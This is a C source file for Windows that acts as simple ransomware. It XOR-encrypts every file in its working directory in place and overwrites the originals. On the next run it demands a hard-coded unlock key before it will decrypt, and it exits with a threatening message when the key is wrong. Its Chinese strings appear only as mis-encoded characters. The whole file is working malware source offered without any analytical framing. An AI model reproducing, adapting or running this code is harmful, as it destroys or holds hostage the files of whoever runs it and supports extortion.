#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#define buffer_size 65536
#include <windows.h>
int encryption(char* file_path,int check)
{
	int password=100;
	char cmd[100];
	sprintf(cmd,"dir /b /a:-d \"%s\" > list_process.txt",file_path);
	system(cmd);
	FILE* flist_process=fopen("list_process.txt","r");
	FILE* fcurrent_file;
	FILE* ftmp;
	size_t res;
	char*buf=(char *)malloc(buffer_size);
	char*tmp=(char *)malloc(buffer_size);
	char current_file[30];
	while(!feof(flist_process))
	{
		fscanf(flist_process,"%s\n",current_file);
		if(strcmp(current_file,"list_process.txt")==0 ||
		strcmp(current_file,"�u�ƪ��[�K.c")==0 ||
		strcmp(current_file,"�u�ƪ��[�K.exe")==0 ||
		strcmp(current_file,"tmper.txt")==0 ||
		strcmp(current_file,"gmon.out")==0 )
		{
			continue;
		}
		if((fcurrent_file=fopen(current_file,"rb"))==NULL)
		{
			printf("%s�[�K����\n",current_file);
			continue;
		}
		if((ftmp=fopen("tmper.txt","ab"))==NULL)
		{
			printf("%s�[�K����\n",current_file);
			continue;
		}
		res=fread(buf,1,buffer_size,fcurrent_file);
		while(res>0)
		{
			int i;
			tmp=buf;
			for(i=0;i<res;i++)
			{
				*buf=*buf^password;
				buf+=1;
			}
			buf=tmp;
			fwrite(buf,1,res,ftmp);
			res=fread(buf,1,buffer_size,fcurrent_file);
		}
		fclose(fcurrent_file);
		fclose(ftmp);
		remove(current_file);
		if((fcurrent_file=fopen(current_file,"ab"))==NULL)
		{
			printf("%s�[�K����\n",current_file);
			continue;
		}
		if((ftmp=fopen("tmper.txt","rb"))==NULL)
		{
			printf("%s�[�K����\n",current_file);
			continue;
		}
		res=fread(buf,1,buffer_size,ftmp);
		while(res>0)
		{
			fwrite(buf,1,res,fcurrent_file);
			res=fread(buf,1,buffer_size,ftmp);
		}
		printf("%s success\n",current_file);
		fclose(fcurrent_file);
		fclose(ftmp);
		remove("tmper.txt");
	}
	fclose(flist_process);
	Sleep(1000);
	if(check==-1)
	{
		remove("list_process.txt");
		system("pause");
		exit(0);
	}
}
int main()
{
	char file_path[100];
	getcwd(file_path,sizeof(file_path));
	char input_key[40];
	char unlock_key[40]="majitoo";
	if(access("list_process.txt",0)==0)//�p�G���s�b 
	{
		while(1)
		{
			printf("�w�������ɮ׳Q�[�K!�Y�n�ѱK�п�J����K�X!\n");
			scanf("%s",input_key);
			if((strcmp(input_key,unlock_key))==0)
			{
				printf("�_�l�X ��J���T!\n");
				printf("�Y�N������\n");
				encryption(file_path,-1);
			}
			else
			{
				printf("�_�l�X ��J���~!�O�Q�A���^�A�ɮפF\n");
				system("pause");
				exit(0);
			}
		}
	}
	else
	{
		encryption(file_path,0);
	}
	system("pause");
}
